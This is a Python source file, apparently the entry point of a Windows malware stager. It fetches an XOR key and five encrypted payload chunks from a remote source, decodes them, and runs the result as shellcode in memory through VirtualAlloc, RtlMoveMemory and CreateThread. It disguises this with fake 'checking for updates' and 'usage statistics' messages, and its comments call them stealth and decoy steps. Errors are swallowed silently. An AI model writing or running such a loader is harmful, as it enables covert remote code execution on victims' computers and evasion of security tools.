import time
import ctypes
from .downloader import Downloader
from .decoder import Decoder

def main():
    downloader = Downloader()
    
    print("[*] Checking for updates...")
    # 1. Authenticate / Get Key
    xor_key = downloader.get_decryption_key()
    if not xor_key:
        print("[-] System up to date.") # Stealthy exit
        return

    # 2. Download Chunks
    # In a real scenario, we know how many chunks or query metadata
    # For demo, assumes 5 chunks
    chunks = []
    print("[*] Downloading package...")
    
    for i in range(5):
        chunk_data = downloader.fetch_chunk(str(i))
        if chunk_data:
            chunks.append(chunk_data)
        else:
            print("[-] Package incomplete.")
            return

    # 3. Assemble
    full_encrypted = "".join(chunks) # Assuming chunks are strictly ordered 0-4
    
    # 4. Decode
    # Seed for custom cipher (could be Env Key or static shared secret)
    custom_seed = "STATIC_SEED" 
    
    print("[*] Processing...")
    payload_bytes = Decoder.decode_pipeline(full_encrypted, xor_key, custom_seed)
    
    if payload_bytes:
        print("[+] Usage statistics report ready.") # Decoy message
        execute_in_memory(payload_bytes)

def execute_in_memory(code_bytes):
    """
    Executes shellcode/payload in memory using ctypes.
    WARNING: This is highly sensitive and will likely be flagged if not careful.
    """
    try:
        # 1. Allocate executable memory
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(code_bytes)),
            ctypes.c_int(0x3000), # MEM_COMMIT | MEM_RESERVE
            ctypes.c_int(0x40)    # PAGE_EXECUTE_READWRITE
        )
        
        # 2. Copy payload to memory
        buf = (ctypes.c_char * len(code_bytes)).from_buffer(code_bytes)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr),
            buf,
            ctypes.c_int(len(code_bytes))
        )
        
        # 3. Create thread
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_int(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0))
        )
        
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
        
    except Exception as e:
        # Silent fail or decoy error
        pass

if __name__ == "__main__":
    main()
